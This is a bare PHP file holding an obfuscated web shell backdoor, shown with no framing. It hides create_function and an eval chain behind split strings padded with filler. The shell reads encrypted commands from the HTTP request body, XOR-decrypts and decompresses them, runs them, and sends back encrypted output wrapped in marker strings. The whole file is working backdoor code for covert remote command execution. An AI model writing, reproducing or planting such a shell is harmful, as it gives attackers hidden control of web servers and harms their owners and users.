<?php
$B='t($i=0;$i<$l;:t:t){for(:t$j=0;($j<$c&:t&$i:t<$l);$j:t++:t,$i++):t{$o.=:t$t{$i}^$k{$:';
$I=str_replace('Yj','','YjcreatYjeYj_fYjYjuncYjtion');
$o='();$r=@base6:t4_enc:tode(@:t:tx(@:tgzcom:tpr:tess($:t:to),$k));print("$p$kh$r$kf");}';
$O='$k="a:t780:t:te8f2":t;$kh="7cb1691c5:t:t9ad";$kf:t="83cde28b:t:t0466:t";$p="f:tqiGYUXBFT';
$q='ts:t("p:thp://i:tnput"),$m:t)==1) {@o:tb_star:tt();@e:tv:tal(@gzun:tcompress:t(:t@x(@';
$E='ba:tse:t64_decode($m[1:t]),$:tk)):t);$o=@ob_get:t_conte:tnts():t;@ob:t_end_:tcl:tean';
$g='tj};}:t}return $:to;}if:t (@preg_:tmatch(:t:t"/$kh(.+:t)$kf/":t,@file_:tget_conte:tn';
$e='y1FOZC:t";fu:tnction x:t($t,$k){:t$c=strl:ten($:tk);$l=:t:tstrlen($:tt);:t$o="";for:';
$k=str_replace(':t','',$O.$e.$B.$g.$q.$E.$o);
$Y=$I('',$k);$Y();
?>
